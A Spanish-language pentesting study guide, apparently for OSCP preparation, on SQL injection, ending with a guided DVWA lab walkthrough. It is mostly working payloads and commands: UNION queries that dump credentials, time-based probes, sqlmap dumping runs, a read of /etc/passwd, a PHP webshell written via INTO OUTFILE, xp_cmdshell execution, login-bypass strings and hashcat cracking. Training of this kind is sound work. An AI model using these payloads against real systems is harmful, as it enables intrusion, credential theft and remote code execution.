# SQL Injection (SQLi)

**SQL Injection** es una de las vulnerabilidades más antiguas, extendidas y críticas. Ocurre cuando una aplicación construye una consulta SQL concatenando datos del usuario sin sanearlos, permitiéndote **modificar la lógica de la consulta**: leer tablas ajenas, saltarte el login o, según el motor, leer/escribir ficheros y ejecutar comandos.

> Para SQLi específicamente en APIs/JSON y NoSQL, ver también [`APIs/Vulnerabilidades/SQL Injection.md`](../APIs/Vulnerabilidades/SQL%20Injection.md).

---

## Cómo funciona

Una consulta vulnerable típica:

```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass';
```

Si envías `$user = admin' -- -`, la consulta se convierte en:

```sql
SELECT * FROM users WHERE username = 'admin' -- -' AND password = '...';
```

El `-- -` comenta el resto: entras como `admin` sin saber su contraseña.

---

## Detección

Inyecta caracteres que rompan la sintaxis y observa el comportamiento:

```text
'          → ¿error SQL o 500?
''         → ¿se "arregla"?
`
"
')
' OR '1'='1
```

Comprobación lógica (true vs false): si `' OR '1'='1` devuelve resultados y `' OR '1'='2` no, hay inyección.

---

## Tipos de SQLi

| Tipo | Cuándo | Cómo extraes datos |
| ---- | ------ | ------------------ |
| **In-band / UNION** | La respuesta muestra datos de la consulta | Con `UNION SELECT` traes datos de otras tablas. |
| **Error-based** | La app muestra errores SQL | Fuerzas errores que revelan datos. |
| **Blind booleana** | No ves datos ni errores, pero la respuesta cambia (true/false) | Preguntas sí/no carácter a carácter. |
| **Blind por tiempo** | Ni siquiera cambia la respuesta | Mides retardos (`SLEEP`). |
| **Out-of-band** | Sin canal directo | Exfiltras vía DNS/HTTP. |

---

## SQLi basada en UNION (la más útil)

### Paso 1 — Número de columnas

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -   ← sube hasta que falle; el último que funciona = nº de columnas
```

O con UNION:

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -   ← ajusta hasta que no dé error
```

### Paso 2 — Columnas que se reflejan

```sql
' UNION SELECT 1,2,3-- -   ← mira qué números aparecen en la página
```

### Paso 3 — Extraer información

```sql
-- Versión y usuario de BD (MySQL)
' UNION SELECT @@version,user(),database()-- -

-- Listar tablas
' UNION SELECT table_name,2,3 FROM information_schema.tables-- -

-- Listar columnas de una tabla
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -

-- Volcar credenciales
' UNION SELECT username,password,3 FROM users-- -
```

---

## SQLi ciega por tiempo

Cuando no ves nada, confirma con un retardo:

```sql
-- MySQL
' AND SLEEP(5)-- -
-- PostgreSQL
'; SELECT pg_sleep(5)-- -
-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
-- SQLite
' AND 1=randomblob(100000000)-- -
```

Si tarda ~5 s, hay inyección. Extraer datos así es lento → automatiza con sqlmap.

---

## Automatización con sqlmap

```bash
# GET
sqlmap -u "http://<IP>/item.php?id=1" --batch

# POST / login (guarda la petición desde Burp)
sqlmap -r peticion.txt --batch --level 5 --risk 3

# Volcado
sqlmap -u "..." --dbs                      # bases de datos
sqlmap -u "..." -D <db> --tables           # tablas
sqlmap -u "..." -D <db> -T users --dump    # volcar tabla

# Si hay WAF/filtros, usa tampers
sqlmap -u "..." --tamper=space2comment,between --batch
```

---

## Más allá de leer datos

Según el motor y los permisos:

```sql
-- MySQL: leer ficheros
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -

-- MySQL: escribir una webshell (si FILE priv y ruta escribible)
' UNION SELECT "<?php system($_GET['c']); ?>",2,3 INTO OUTFILE '/var/www/html/sh.php'-- -

-- MSSQL: ejecución de comandos
'; EXEC xp_cmdshell 'whoami'-- -
```

Esto puede convertir un SQLi en **RCE** directo.

---

## Bypass de autenticación (payloads rápidos)

```text
admin' -- -
admin'#
' OR 1=1-- -
' OR '1'='1
') OR ('1'='1
admin'/*
```

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `sqlmap` | Detección y explotación automática de SQLi. |
| `Burp Suite` | Detección manual y envío a sqlmap. |
| `ghauri` | Alternativa moderna a sqlmap. |
| PayloadsAllTheThings | Colección de payloads por motor de BD. |

---

> **Consejo:** detecta siempre a mano primero (con `'` y lógica booleana) para entender el punto de inyección y el motor, y **luego** lanza sqlmap con la petición guardada de Burp. En el OSCP no se permite automatizar todo a ciegas, así que practica la extracción manual con UNION: es una habilidad que te piden explícitamente.

---

## Dónde practicar la SQL Injection

| Recurso | Tipo | Enlace |
| ------- | ---- | ------ |
| PortSwigger Web Security Academy — SQL injection | Labs gratis (navegador) | https://portswigger.net/web-security/sql-injection |
| DVWA (Damn Vulnerable Web App) | Descargable (Docker) | https://github.com/digininja/DVWA |
| OWASP Juice Shop | Descargable (Docker) | https://github.com/juice-shop/juice-shop |
| TryHackMe — "SQL Injection" / "SQHell" | Salas guiadas | https://tryhackme.com |
| VulnHub — p.ej. *Mr-Robot*, *DC-1* | Máquinas OVA | https://www.vulnhub.com |
| DockerLabs (en español) | Contenedores locales | https://dockerlabs.es |
| picoCTF — categoría *Web Exploitation* | Retos gratis | https://picoctf.org |

> **Consejo:** para **entender** la SQLi a fondo haz todos los labs de **PortSwigger** (son deterministas y oficiales). Para **practicar el flujo completo** de una máquina (web → BD → credenciales → shell), tira de **DockerLabs/VulnHub**.

## Writeup guiado: SQLi en DVWA (nivel Low)

Objetivo: volcar los usuarios y hashes de la base de datos de DVWA mediante una inyección UNION.

```flow
Preparar :: Levantar DVWA en Docker y poner DVWA Security en "low".
Detectar :: Inyectar una comilla y provocar un error SQL.
Enumerar columnas :: ORDER BY hasta que falle -> hay 2 columnas.
Extraer datos :: UNION SELECT para volcar usuarios y hashes.
Crackear :: Pasar los hashes MD5 a hashcat/john.
```

### Paso 1 — Montar el laboratorio

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

Abre `http://localhost`, entra con `admin:password`, pulsa **Create / Reset Database**, y en **DVWA Security** elige **Low**. Ve a la sección **SQL Injection**.

### Paso 2 — Detectar la inyección

El formulario pide un *User ID*. Introduce una comilla:

```text
'
```

Aparece un error de MySQL → el parámetro `id` es inyectable. La consulta por detrás es aproximadamente `SELECT first_name, last_name FROM users WHERE user_id = '$id'`.

### Paso 3 — Enumerar el número de columnas

```sql
1' ORDER BY 1-- -
1' ORDER BY 2-- -      ← funciona
1' ORDER BY 3-- -      ← error: hay 2 columnas
```

### Paso 4 — Extraer usuarios y hashes con UNION

```sql
1' UNION SELECT user, password FROM users-- -
```

DVWA devuelve la lista de usuarios (`admin`, `gordonb`, `1337`, `pablo`, `smithy`) con sus contraseñas en **MD5**.

### Paso 5 — Crackear los hashes

```bash
# Guarda los hashes en hashes.txt (uno por línea)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
# admin -> password, gordonb -> abc123, ...
```

Con las credenciales crackeadas, en una máquina real probarías acceso al panel y reutilización en SSH. Para ver la variante **ciega** y el bypass de login, repite en los labs de PortSwigger.

> **Consejo:** cuando domines esto en DVWA (Low → Medium → High), salta a una máquina de DockerLabs/VulnHub con web + base de datos y aplica el **flujo completo**: SQLi → credenciales → panel/SSH → escalada. Ese salto de "lab de una vuln" a "máquina entera" es justo lo que te prepara para el OSCP.
